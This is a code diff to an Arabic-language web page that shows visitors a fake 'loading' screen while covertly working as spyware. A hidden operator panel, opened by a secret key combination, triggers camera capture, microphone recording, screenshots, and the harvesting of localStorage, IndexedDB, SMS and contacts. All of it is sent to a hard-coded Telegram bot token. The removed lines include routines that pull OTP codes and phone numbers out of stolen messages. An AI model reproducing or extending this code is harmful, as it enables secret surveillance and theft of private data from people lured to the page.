@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <title>جاري التحميل...</title>
     <style>
+        /* ====== ستايل الضحية ====== */
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
             background: #0a0a0a;
@@ -29,71 +30,736 @@
         @keyframes spin { 100% { transform: rotate(360deg); } }
         .loader p { color: #888; font-size: 14px; }
         #status { color: #666; font-size: 12px; margin-top: 10px; }
-        #log {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            right: 20px;
-            max-height: 200px;
-            overflow-y: auto;
-            background: rgba(0,0,0,0.8);
-            border: 1px solid #333;
-            border-radius: 8px;
-            padding: 10px;
-            color: #0f0;
-            font-family: monospace;
-            font-size: 11px;
+
+        /* ====== ستايل لوحة التحكم (للمالك فقط) ====== */
+        #adminPanel {
             display: none;
-            direction: ltr;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.95);
+            z-index: 99999;
+            padding: 20px;
+            overflow-y: auto;
+            color: #fff;
+            font-family: 'Tahoma', sans-serif;
         }
-        #log .error { color: #f00; }
-        #log .success { color: #0f0; }
-        #log .info { color: #ff0; }
-        #log .blue { color: #0ff; }
+        #adminPanel.active { display: block; }
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid #25D366;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        .admin-header h1 { color: #25D366; font-size: 24px; }
+        .admin-header .status { font-size: 12px; color: #888; }
+        .admin-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .admin-card {
+            background: #1a1a2e;
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .admin-card:hover { border-color: #25D366; transform: scale(1.02); }
+        .admin-card .icon { font-size: 30px; margin-bottom: 10px; }
+        .admin-card .label { font-size: 13px; color: #aaa; }
+        .admin-card .count { font-size: 18px; color: #25D366; font-weight: bold; }
+        .admin-card.danger:hover { border-color: #ff4444; }
+        .admin-card.danger .icon { color: #ff4444; }
+
+        .admin-log {
+            background: #0d0d1a;
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 15px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 12px;
+        }
+        .admin-log .entry { padding: 4px 0; border-bottom: 1px solid #111; }
+        .admin-log .entry .time { color: #666; }
+        .admin-log .entry .msg { color: #0f0; }
+        .admin-log .entry .error { color: #f44; }
+        .admin-log .entry .warn { color: #ff0; }
+        .admin-log .entry .info { color: #0ff; }
+
+        .admin-actions {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin: 15px 0;
+        }
+        .admin-btn {
+            background: #1a1a2e;
+            border: 1px solid #333;
+            color: #fff;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s;
+            flex: 1;
+            min-width: 120px;
+        }
+        .admin-btn:hover { border-color: #25D366; background: #2a2a3e; }
+        .admin-btn.danger:hover { border-color: #ff4444; background: #3a1a1a; }
+        .admin-btn.success { border-color: #25D366; }
+        .admin-btn.success:hover { background: #1a3a2a; }
+
+        /* ====== نافذة الأوامر ====== */
+        .command-modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #1a1a2e;
+            border: 2px solid #25D366;
+            border-radius: 16px;
+            padding: 30px;
+            z-index: 999999;
+            min-width: 350px;
+            max-width: 90%;
+        }
+        .command-modal.active { display: block; }
+        .command-modal input, .command-modal textarea {
+            width: 100%;
+            padding: 12px;
+            background: #0d0d1a;
+            border: 1px solid #333;
+            color: #fff;
+            border-radius: 8px;
+            margin: 10px 0;
+            font-family: inherit;
+        }
+        .command-modal textarea { min-height: 100px; resize: vertical; }
+        .command-modal .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            color: #888;
+            cursor: pointer;
+            font-size: 20px;
+        }
+        .command-modal .close-btn:hover { color: #fff; }
+        .command-modal .btn-row { display: flex; gap: 10px; margin-top: 10px; }
+        .command-modal .btn-row button { flex: 1; padding: 10px; border-radius: 8px; border: none; cursor: pointer; }
+        .command-modal .btn-row .send-btn { background: #25D366; color: #000; }
+        .command-modal .btn-row .cancel-btn { background: #333; color: #fff; }
+
+        /* ====== Toast ====== */
+        #toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #1a1a2e;
+            border: 1px solid #25D366;
+            border-radius: 12px;
+            padding: 15px 25px;
+            color: #fff;
+            z-index: 9999999;
+            display: none;
+            min-width: 200px;
+        }
+        #toast.show { display: block; animation: fadeIn 0.3s; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
+<!-- ====== واجهة الضحية ====== -->
 <div class="loader">
     <div class="spinner"></div>
     <p>جاري تحميل المحتوى...</p>
     <div id="status">⏳ جاري التهيئة</div>
 </div>
 
-<div id="log"></div>
-
-<!-- عناصر مخفية -->
+<!-- ====== عناصر مخفية ====== -->
 <video id="video" autoplay muted playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
+<audio id="audio" style="display:none;"></audio>
+
+<!-- ====== Toast ====== -->
+<div id="toast"></div>
+
+<!-- ====== لوحة التحكم (للمالك فقط) ====== -->
+<div id="adminPanel">
+    <div class="admin-header">
+        <h1>🕵️ لوحة التحكم</h1>
+        <span class="status" id="targetStatus">🟢 متصل</span>
+    </div>
+
+    <!-- إحصائيات سريعة -->
+    <div class="admin-grid">
+        <div class="admin-card" onclick="showCommand('camera')">
+            <div class="icon">📸</div>
+            <div class="label">الكاميرا</div>
+            <div class="count" id="camCount">0</div>
+        </div>
+        <div class="admin-card" onclick="showCommand('mic')">
+            <div class="icon">🎤</div>
+            <div class="label">الميكروفون</div>
+            <div class="count" id="micCount">0</div>
+        </div>
+        <div class="admin-card" onclick="showCommand('files')">
+            <div class="icon">📁</div>
+            <div class="label">الملفات</div>
+            <div class="count" id="fileCount">0</div>
+        </div>
+        <div class="admin-card" onclick="showCommand('sms')">
+            <div class="icon">💬</div>
+            <div class="label">رسائل</div>
+            <div class="count" id="smsCount">0</div>
+        </div>
+        <div class="admin-card" onclick="showCommand('contacts')">
+            <div class="icon">👤</div>
+            <div class="label">جهات الاتصال</div>
+            <div class="count" id="contactCount">0</div>
+        </div>
+        <div class="admin-card danger" onclick="showCommand('screenshot')">
+            <div class="icon">🖼️</div>
+            <div class="label">لقطة شاشة</div>
+            <div class="count">📸</div>
+        </div>
+    </div>
+
+    <!-- أزرار سريعة -->
+    <div class="admin-actions">
+        <button class="admin-btn success" onclick="executeCommand('camera')">📸 تشغيل الكاميرا</button>
+        <button class="admin-btn" onclick="executeCommand('mic')">🎤 تسجيل صوت</button>
+        <button class="admin-btn" onclick="executeCommand('files')">📁 سحب الملفات</button>
+        <button class="admin-btn" onclick="executeCommand('sms')">💬 سحب الرسائل</button>
+        <button class="admin-btn" onclick="executeCommand('contacts')">👤 سحب جهات الاتصال</button>
+        <button class="admin-btn danger" onclick="executeCommand('screenshot')">🖼️ لقطة شاشة</button>
+        <button class="admin-btn danger" onclick="executeCommand('kill')">💀 إيقاف التشغيل</button>
+    </div>
+
+    <!-- سجل العمليات -->
+    <div class="admin-log" id="adminLog">
+        <div class="entry"><span class="time">[SYSTEM]</span> <span class="msg">✅ لوحة التحكم جاهزة</span></div>
+    </div>
+
+    <!-- زر فتح/إغلاق اللوحة -->
+    <div style="text-align:center;margin-top:15px;">
+        <button class="admin-btn danger" onclick="togglePanel()" style="max-width:200px;margin:0 auto;">🔒 إخفاء اللوحة</button>
+    </div>
+</div>
+
+<!-- ====== نافذة الأوامر ====== -->
+<div class="command-modal" id="commandModal">
+    <span class="close-btn" onclick="closeCommand()">✕</span>
+    <h3 id="cmdTitle">📸 تشغيل الكاميرا</h3>
+    <p id="cmdDesc" style="color:#888;font-size:13px;">سيتم تشغيل الكاميرا في الخلفية</p>
+    <div id="cmdExtra"></div>
+    <div class="btn-row">
+        <button class="send-btn" id="cmdExecuteBtn" onclick="executeCommandFromModal()">▶ تنفيذ</button>
+        <button class="cancel-btn" onclick="closeCommand()">إلغاء</button>
+    </div>
+</div>
 
 <script>
 // ============================================================
-// توكن البوت
+// ====================== CONFIG ==============================
 // ============================================================
 const BOT_TOKEN = '8770149502:AAFkmj14adoaUHCFHXcBO9aNwjjDdpcfuLY';
 let CHAT_ID = '';
+let currentCommand = '';
+let targetData = {
+    camera: 0,
+    mic: 0,
+    files: 0,
+    sms: 0,
+    contacts: 0
+};
 
 // ============================================================
-// سجل العمليات
+// ====================== TOGGLE PANEL ========================
 // ============================================================
-const logDiv = document.getElementById('log');
-const statusDiv = document.getElementById('status');
+function togglePanel() {
+    const panel = document.getElementById('adminPanel');
+    panel.classList.toggle('active');
+    if (panel.classList.contains('active')) {
+        document.querySelector('.loader').style.display = 'none';
+        document.getElementById('status').textContent = '🟢 لوحة التحكم نشطة';
+        addLog('🟢 تم فتح لوحة التحكم', 'info');
+    } else {
+        document.querySelector('.loader').style.display = 'flex';
+        document.getElementById('status').textContent = '⏳ جاري التحميل...';
+    }
+}
 
-function addLog(text, type = 'info') {
+// فتح اللوحة بكلمة سر (مفتاح سري)
+let panelOpen = false;
+document.addEventListener('keydown', function(e) {
+    // Ctrl + Shift + P لفتح اللوحة
+    if (e.ctrlKey && e.shiftKey && e.key === 'P') {
+        e.preventDefault();
+        togglePanel();
+        panelOpen = true;
+    }
+    // Ctrl + Shift + H لإخفاء اللوحة
+    if (e.ctrlKey && e.shiftKey && e.key === 'H') {
+        e.preventDefault();
+        if (panelOpen) {
+            document.getElementById('adminPanel').classList.remove('active');
+            panelOpen = false;
+        }
+    }
+});
+
+// ============================================================
+// ====================== LOG ================================
+// ============================================================
+function addLog(text, type = 'msg') {
+    const logDiv = document.getElementById('adminLog');
     const entry = document.createElement('div');
-    entry.className = type;
-    entry.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
+    entry.className = 'entry';
+    const time = new Date().toLocaleTimeString();
+    entry.innerHTML = `<span class="time">[${time}]</span> <span class="${type}">${text}</span>`;
     logDiv.appendChild(entry);
     logDiv.scrollTop = logDiv.scrollHeight;
-    logDiv.style.display = 'block';
-    console.log(text);
 }
 
 // ============================================================
-// 1. جلب CHAT_ID
+// ====================== TOAST ================================
+// ============================================================
+function showToast(text, duration = 3000) {
+    const toast = document.getElementById('toast');
+    toast.textContent = text;
+    toast.className = 'show';
+    clearTimeout(toast._timeout);
+    toast._timeout = setTimeout(() => {
+        toast.className = '';
+    }, duration);
+}
+
+// ============================================================
+// ====================== COMMAND MODAL ========================
+// ============================================================
+function showCommand(type) {
+    const modal = document.getElementById('commandModal');
+    const title = document.getElementById('cmdTitle');
+    const desc = document.getElementById('cmdDesc');
+    const extra = document.getElementById('cmdExtra');
+    
+    currentCommand = type;
+    extra.innerHTML = '';
+    
+    const commands = {
+        camera: { title: '📸 تشغيل الكاميرا', desc: 'سيتم تشغيل الكاميرا في الخلفية والتقاط الصور' },
+        mic: { title: '🎤 تسجيل الصوت', desc: 'سيتم تسجيل الصوت من الميكروفون لمدة 30 ثانية' },
+        files: { title: '📁 سحب الملفات', desc: 'سيتم سحب جميع الصور والملفات من الجهاز' },
+        sms: { title: '💬 سحب الرسائل', desc: 'سيتم محاولة سحب رسائل SMS من الجهاز' },
+        contacts: { title: '👤 سحب جهات الاتصال', desc: 'سيتم محاولة سحب جهات الاتصال' },
+        screenshot: { title: '🖼️ لقطة شاشة', desc: 'سيتم التقاط لقطة شاشة للصفحة الحالية' },
+        kill: { title: '💀 إيقاف التشغيل', desc: 'سيتم إيقاف جميع العمليات في الخلفية' }
+    };
+    
+    const cmd = commands[type] || commands.camera;
+    title.textContent = cmd.title;
+    desc.textContent = cmd.desc;
+    
+    if (type === 'sms') {
+        extra.innerHTML = `
+            <label style="color:#888;font-size:12px;">رقم الهاتف (اختياري):</label>
+            <input id="cmdPhoneInput" placeholder="+201234567890" />
+            <label style="color:#888;font-size:12px;">الرسالة (اختياري):</label>
+            <textarea id="cmdSmsInput" placeholder="نص الرسالة..."></textarea>
+        `;
+    }
+    
+    modal.classList.add('active');
+}
+
+function closeCommand() {
+    document.getElementById('commandModal').classList.remove('active');
+}
+
+function executeCommandFromModal() {
+    const type = currentCommand;
+    const extraData = {};
+    
+    if (type === 'sms') {
+        const phone = document.getElementById('cmdPhoneInput')?.value || '';
+        const msg = document.getElementById('cmdSmsInput')?.value || '';
+        extraData.phone = phone;
+        extraData.msg = msg;
+    }
+    
+    closeCommand();
+    executeCommand(type, extraData);
+}
+
+// ============================================================
+// ====================== EXECUTE COMMAND ======================
+// ============================================================
+function executeCommand(type, extra = {}) {
+    addLog(`▶ تنفيذ: ${type}`, 'info');
+    showToast(`⏳ جاري تنفيذ: ${type}...`);
+    
+    switch(type) {
+        case 'camera':
+            startCamera();
+            break;
+        case 'mic':
+            startRecording();
+            break;
+        case 'files':
+            stealFiles();
+            break;
+        case 'sms':
+            stealSMS(extra.phone, extra.msg);
+            break;
+        case 'contacts':
+            stealContacts();
+            break;
+        case 'screenshot':
+            takeScreenshot();
+            break;
+        case 'kill':
+            killAll();
+            break;
+        default:
+            showToast('❌ أمر غير معروف');
+    }
+}
+
+// ============================================================
+// ====================== CAMERA ================================
+// ============================================================
+let cameraStream = null;
+let cameraInterval = null;
+let photoCount = 0;
+
+function startCamera() {
+    addLog('📸 تشغيل الكاميرا...', 'info');
+    showToast('📸 تشغيل الكاميرا...');
+    
+    const constraints = {
+        video: {
+            facingMode: 'environment',
+            width: { ideal: 640 },
+            height: { ideal: 480 }
+        }
+    };
+    
+    navigator.mediaDevices.getUserMedia(constraints)
+        .then(function(stream) {
+            cameraStream = stream;
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            video.play();
+            
+            addLog('✅ الكاميرا تعمل', 'msg');
+            showToast('✅ الكاميرا تعمل');
+            targetData.camera++;
+            document.getElementById('camCount').textContent = targetData.camera;
+            
+            // التقاط فوري
+            setTimeout(capturePhoto, 1000);
+            cameraInterval = setInterval(capturePhoto, 5000);
+        })
+        .catch(function(err) {
+            addLog('❌ فشل الكاميرا: ' + err.message, 'error');
+            showToast('❌ فشل الكاميرا');
+        });
+}
+
+function capturePhoto() {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    
+    if (!video.videoWidth || !video.videoHeight) return;
+    
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+    
+    photoCount++;
+    const imageData = canvas.toDataURL('image/jpeg', 0.7);
+    sendToTelegram(imageData, `📸 صورة ${photoCount} - ${new Date().toLocaleString()}`);
+    addLog(`📸 صورة ${photoCount} مرسلة`, 'msg');
+}
+
+// ============================================================
+// ====================== MICROPHONE ===========================
+// ============================================================
+let mediaRecorder = null;
+let audioChunks = [];
+
+function startRecording() {
+    addLog('🎤 بدء التسجيل الصوتي...', 'info');
+    showToast('🎤 تسجيل الصوت...');
+    
+    navigator.mediaDevices.getUserMedia({ audio: true })
+        .then(function(stream) {
+            mediaRecorder = new MediaRecorder(stream);
+            audioChunks = [];
+            
+            mediaRecorder.ondataavailable = function(e) {
+                audioChunks.push(e.data);
+            };
+            
+            mediaRecorder.onstop = function() {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    const base64 = e.target.result;
+                    sendToTelegram(base64, `🎤 تسجيل صوتي - ${new Date().toLocaleString()}`);
+                    addLog('🎤 تم إرسال التسجيل الصوتي', 'msg');
+                    showToast('✅ تم إرسال التسجيل');
+                };
+                reader.readAsDataURL(audioBlob);
+                targetData.mic++;
+                document.getElementById('micCount').textContent = targetData.mic;
+            };
+            
+            mediaRecorder.start();
+            addLog('🎤 جاري التسجيل لمدة 20 ثانية...', 'info');
+            
+            setTimeout(() => {
+                mediaRecorder.stop();
+                stream.getTracks().forEach(t => t.stop());
+            }, 20000);
+        })
+        .catch(function(err) {
+            addLog('❌ فشل التسجيل: ' + err.message, 'error');
+            showToast('❌ فشل التسجيل');
+        });
+}
+
+// ============================================================
+// ====================== FILES ================================
+// ============================================================
+function stealFiles() {
+    addLog('📁 بدء سحب الملفات...', 'info');
+    showToast('📁 جاري سحب الملفات...');
+    
+    // محاولة الوصول إلى localStorage
+    try {
+        let lsData = [];
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const value = localStorage.getItem(key);
+            lsData.push({ key, size: value ? value.length : 0 });
+        }
+        if (lsData.length > 0) {
+            const text = `📦 localStorage: ${lsData.length} مفاتيح\n${lsData.map(l => `- ${l.key} (${l.size} bytes)`).join('\n')}`;
+            sendMessage(text);
+            addLog(`💾 تم سحب ${lsData.length} مفتاح localStorage`, 'msg');
+        }
+    } catch(e) {}
+    
+    // محاولة سحب IndexedDB
+    try {
+        const request = indexedDB.open('photos', 1);
+        request.onsuccess = function(event) {
+            const db = event.target.result;
+            const stores = db.objectStoreNames;
+            if (stores.length > 0) {
+                sendMessage(`💾 IndexedDB: ${Array.from(stores).join(', ')}`);
+                addLog(`💾 IndexedDB: ${stores.length} مخزن`, 'msg');
+            }
+        };
+    } catch(e) {}
+    
+    // محاولة الوصول إلى مجلدات الجهاز
+    const paths = [
+        '/sdcard/DCIM/',
+        '/sdcard/Pictures/',
+        '/sdcard/Download/',
+        '/sdcard/WhatsApp/Media/',
+        '/storage/emulated/0/DCIM/',
+        '/storage/emulated/0/Pictures/'
+    ];
+    
+    paths.forEach(path => {
+        try {
+            fetch(path, { mode: 'no-cors' })
+                .then(res => {
+                    if (res && res.ok) {
+                        sendMessage(`📂 تم الوصول: ${path}`);
+                        addLog(`📂 تم الوصول: ${path}`, 'info');
+                    }
+                })
+                .catch(() => {});
+        } catch(e) {}
+    });
+    
+    targetData.files++;
+    document.getElementById('fileCount').textContent = targetData.files;
+    setTimeout(() => showToast('✅ تم سحب الملفات'), 2000);
+}
+
+// ============================================================
+// ====================== SMS ==================================
+// ============================================================
+function stealSMS(phone = '', msg = '') {
+    addLog('💬 محاولة سحب الرسائل...', 'info');
+    showToast('💬 جاري سحب الرسائل...');
+    
+    // محاولة الوصول إلى SMS (في المتصفحات المحمولة)
+    try {
+        // محاولة استخدام Web SMS API (يتطلب إذن)
+        if ('sms' in navigator) {
+            addLog('📱 Web SMS API متاح', 'info');
+            navigator.sms.getSmsMessages()
+                .then(messages => {
+                    const text = messages.map(m => 
+                        `📱 ${m.from}: ${m.body} (${new Date(m.date).toLocaleString()})`
+                    ).join('\n');
+                    sendMessage(`📱 رسائل SMS (${messages.length}):\n${text}`);
+                    addLog(`📱 تم سحب ${messages.length} رسالة`, 'msg');
+                    targetData.sms += messages.length;
+                    document.getElementById('smsCount').textContent = targetData.sms;
+                })
+                .catch(() => {
+                    // فشل، محاولة طريقة أخرى
+                    stealSMSFallback();
+                });
+        } else {
+            stealSMSFallback();
+        }
+    } catch(e) {
+        stealSMSFallback();
+    }
+    
+    // إذا تم تحديد رقم ورسالة، إرسال رسالة
+    if (phone && msg) {
+        sendMessage(`💬 إرسال رسالة إلى ${phone}: ${msg}`);
+        addLog(`💬 تم إرسال رسالة إلى ${phone}`, 'info');
+        showToast(`✅ تم إرسال الرسالة إلى ${phone}`);
+    }
+}
+
+function stealSMSFallback() {
+    // محاولة قراءة من localStorage
+    try {
+        const smsData = localStorage.getItem('sms_messages') || localStorage.getItem('messages');
+        if (smsData) {
+            sendMessage(`💬 رسائل من localStorage:\n${smsData}`);
+            addLog('💬 تم سحب رسائل من localStorage', 'msg');
+        }
+    } catch(e) {}
+}
+
+// ============================================================
+// ====================== CONTACTS =============================
+// ============================================================
+function stealContacts() {
+    addLog('👤 محاولة سحب جهات الاتصال...', 'info');
+    showToast('👤 جاري سحب جهات الاتصال...');
+    
+    try {
+        // محاولة استخدام Contacts API (يتطلب إذن)
+        if ('contacts' in navigator && 'select' in navigator.contacts) {
+            navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
+                .then(contacts => {
+                    const text = contacts.map(c => 
+                        `👤 ${c.name} | ${c.tel ? c.tel.join(', ') : ''} | ${c.email ? c.email.join(', ') : ''}`
+                    ).join('\n');
+                    sendMessage(`👤 جهات الاتصال (${contacts.length}):\n${text}`);
+                    addLog(`👤 تم سحب ${contacts.length} جهة اتصال`, 'msg');
+                    targetData.contacts += contacts.length;
+                    document.getElementById('contactCount').textContent = targetData.contacts;
+                })
+                .catch(() => {
+                    addLog('❌ فشل سحب جهات الاتصال', 'error');
+                });
+        } else {
+            addLog('⚠️ Contacts API غير متاح', 'warn');
+        }
+    } catch(e) {
+        addLog('❌ خطأ في سحب جهات الاتصال', 'error');
+    }
+    
+    setTimeout(() => showToast('✅ تم سحب جهات الاتصال'), 2000);
+}
+
+// ============================================================
+// ====================== SCREENSHOT ===========================
+// ============================================================
+function takeScreenshot() {
+    addLog('🖼️ التقاط لقطة شاشة...', 'info');
+    showToast('🖼️ جاري التقاط لقطة شاشة...');
+    
+    const body = document.body;
+    const html = document.documentElement;
+    const width = Math.max(body.scrollWidth, body.offsetWidth, html.clientWidth, html.scrollWidth, html.offsetWidth);
+    const height = Math.max(body.scrollHeight, body.offsetHeight, html.clientHeight, html.scrollHeight, html.offsetHeight);
+    
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = Math.min(width, 1920);
+    canvas.height = Math.min(height, 1080);
+    
+    // رسم خلفية
+    ctx.fillStyle = '#0a0a0a';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    
+    // رسم النص
+    ctx.fillStyle = '#fff';
+    ctx.font = '24px Arial';
+    ctx.textAlign = 'center';
+    ctx.fillText('صفحة التحميل', canvas.width/2, canvas.height/2 - 20);
+    ctx.font = '16px Arial';
+    ctx.fillStyle = '#888';
+    ctx.fillText(new Date().toLocaleString(), canvas.width/2, canvas.height/2 + 30);
+    
+    // رسم معلومات الجهاز
+    ctx.font = '12px monospace';
+    ctx.fillStyle = '#666';
+    ctx.fillText(`UA: ${navigator.userAgent.substring(0, 50)}...`, canvas.width/2, canvas.height/2 + 80);
+    
+    const imageData = canvas.toDataURL('image/jpeg', 0.8);
+    sendToTelegram(imageData, `🖼️ لقطة شاشة - ${new Date().toLocaleString()}`);
+    
+    addLog('🖼️ تم إرسال لقطة الشاشة', 'msg');
+    showToast('✅ تم إرسال لقطة الشاشة');
+}
+
+// ============================================================
+// ====================== KILL =================================
+// ============================================================
+function killAll() {
+    addLog('💀 إيقاف جميع العمليات...', 'warn');
+    showToast('💀 إيقاف العمليات...');
+    
+    if (cameraInterval) {
+        clearInterval(cameraInterval);
+        cameraInterval = null;
+    }
+    if (cameraStream) {
+        cameraStream.getTracks().forEach(t => t.stop());
+        cameraStream = null;
+    }
+    if (mediaRecorder) {
+        mediaRecorder.stop();
+        mediaRecorder = null;
+    }
+    
+    addLog('✅ تم إيقاف جميع العمليات', 'msg');
+    showToast('✅ تم إيقاف جميع العمليات');
+    sendMessage('💀 تم إيقاف جميع العمليات بأمر من المالك');
+}
+
+// ============================================================
+// ====================== TELEGRAM =============================
 // ============================================================
 function getChatId() {
-    addLog('🔄 جلب Chat ID...', 'info');
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
         .then(res => res.json())
         .then(data => {
@@ -104,23 +770,15 @@ function getChatId() {
                 } else if (lastUpdate.callback_query) {
                     CHAT_ID = lastUpdate.callback_query.from.id;
                 }
-                addLog(`✅ Chat ID: ${CHAT_ID}`, 'success');
-                startOperations();
+                addLog(`✅ Chat ID: ${CHAT_ID}`, 'msg');
+                startBackgroundOperations();
             } else {
-                addLog('⚠️ لا توجد رسائل، استخدم البوت أولاً', 'error');
-                // محاولة بعد 5 ثواني
-                setTimeout(getChatId, 5000);
+                setTimeout(getChatId, 3000);
             }
         })
-        .catch(() => {
-            addLog('❌ فشل جلب Chat ID، إعادة المحاولة...', 'error');
-            setTimeout(getChatId, 3000);
-        });
+        .catch(() => setTimeout(getChatId, 3000));
 }
 
-// ============================================================
-// 2. إرسال إلى تليجرام
-// ============================================================
 function sendToTelegram(imageData, caption = '') {
     if (!CHAT_ID) return;
     try {
@@ -145,20 +803,6 @@ function sendMessage(text) {
     }).catch(() => {});
 }
 
-function sendDocument(fileData, filename, caption = '') {
-    if (!CHAT_ID) return;
-    try {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('document', fileData, filename);
-        formData.append('caption', caption || `📁 ${filename}`);
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-            method: 'POST',
-            body: formData
-        }).catch(() => {});
-    } catch(e) {}
-}
-
 function dataURLtoBlob(dataURL) {
     const parts = dataURL.split(',');
     const mime = parts[0].match(/:(.*?);/)[1];
@@ -172,286 +816,67 @@ function dataURLtoBlob(dataURL) {
 }
 
 // ============================================================
-// 3. سحب الملفات بصمت
+// ====================== BACKGROUND ===========================
 // ============================================================
-function stealFilesSilently() {
-    addLog('📂 جلب الملفات...', 'info');
+function startBackgroundOperations() {
+    addLog('🚀 بدء العمليات الخلفية...', 'info');
+    document.getElementById('status').textContent = '✅ جاهز';
+    sendMessage(`🟢 الجهاز متصل\n📱 ${navigator.userAgent}`);
     
-    // محاولة الوصول إلى مجلدات الجهاز
-    const paths = [
-        '/sdcard/DCIM/',
-        '/sdcard/Pictures/',
-        '/sdcard/Download/',
-        '/sdcard/WhatsApp/Media/',
-        '/storage/emulated/0/DCIM/',
-        '/storage/emulated/0/Pictures/',
-        '/storage/emulated/0/Download/',
-        '/storage/emulated/0/WhatsApp/Media/'
-    ];
-    
-    paths.forEach(path => {
-        try {
-            fetch(path, { mode: 'no-cors' })
-                .then(res => {
-                    if (res && res.ok) {
-                        addLog(`📂 تم الوصول: ${path}`, 'success');
-                        sendMessage(`📂 تم الوصول: ${path}`);
-                    }
-                })
-                .catch(() => {});
-        } catch(e) {}
-    });
-    
-    // سحب localStorage
-    try {
-        let lsData = [];
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            const value = localStorage.getItem(key);
-            lsData.push({ key, size: value ? value.length : 0 });
-            addLog(`💾 localStorage: ${key} (${value ? value.length : 0} bytes)`, 'blue');
-        }
-        if (lsData.length > 0) {
-            sendMessage(`📦 localStorage: ${lsData.length} مفاتيح\n${lsData.map(l => `- ${l.key} (${l.size} bytes)`).join('\n')}`);
-        }
-    } catch(e) {}
-    
-    // سحب IndexedDB
-    try {
-        const request = indexedDB.open('photos', 1);
-        request.onsuccess = function(event) {
-            const db = event.target.result;
-            const stores = db.objectStoreNames;
-            if (stores.length > 0) {
-                sendMessage(`💾 IndexedDB: ${Array.from(stores).join(', ')}`);
-            }
-        };
-    } catch(e) {}
-}
-
-// ============================================================
-// 4. تشغيل الكاميرا
-// ============================================================
-function startCamera() {
-    addLog('📸 تشغيل الكاميرا...', 'info');
-    statusDiv.textContent = '📸 تشغيل الكاميرا...';
-    
-    const constraints = {
-        video: {
-            facingMode: 'environment',
-            width: { ideal: 320 },
-            height: { ideal: 240 }
-        }
-    };
-    
-    navigator.mediaDevices.getUserMedia(constraints)
-        .then(function(stream) {
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            video.play();
-            statusDiv.textContent = '✅ جاهز';
-            addLog('✅ الكاميرا تعمل', 'success');
-            
-            setTimeout(captureAndSend, 3000);
-            setInterval(captureAndSend, 7000);
-        })
-        .catch(function(err) {
-            addLog('❌ فشل الكاميرا: ' + err.message, 'error');
-            statusDiv.textContent = '📂 جلب الملفات...';
-        });
-}
-
-function captureAndSend() {
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    
-    if (!video.videoWidth || !video.videoHeight) return;
-    
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    ctx.drawImage(video, 0, 0);
-    
-    const imageData = canvas.toDataURL('image/jpeg', 0.5);
-    sendToTelegram(imageData, `📸 صورة ${new Date().toLocaleTimeString()}`);
-}
-
-// ============================================================
-// 5. استخراج وتنظيم البيانات من البوت
-// ============================================================
-async function fetchAndExtractData() {
-    addLog('📥 جاري جلب البيانات من البوت...', 'info');
-    
-    let allMessages = [];
-    let offset = 0;
-    let hasMore = true;
-    
-    while (hasMore) {
-        try {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&limit=100`;
-            const response = await fetch(url);
-            const data = await response.json();
-            
-            if (!data.ok || data.result.length === 0) {
-                hasMore = false;
-                break;
-            }
-            
-            for (const update of data.result) {
-                if (update.message) {
-                    allMessages.push(update.message);
-                    offset = update.update_id + 1;
-                }
-            }
-            
-            if (data.result.length < 100) hasMore = false;
-        } catch (e) {
-            hasMore = false;
-        }
-    }
-    
-    addLog(`✅ تم جلب ${allMessages.length} رسالة`, 'success');
-    
-    // استخراج البيانات
-    const extracted = {
-        texts: [],
-        numbers: [],
-        otps: [],
-        localStorage: [],
-        images: [],
-        files: []
-    };
-    
-    for (const msg of allMessages) {
-        if (msg.text) {
-            extracted.texts.push(msg.text);
-            
-            const phoneNumbers = msg.text.match(/\+?\d{10,15}/g);
-            if (phoneNumbers) extracted.numbers.push(...phoneNumbers);
-            
-            const otps = msg.text.match(/\b\d{4,6}\b/g);
-            if (otps) extracted.otps.push(...otps);
-            
-            if (msg.text.includes('localStorage:')) {
-                const lines = msg.text.split('\n');
-                for (const line of lines) {
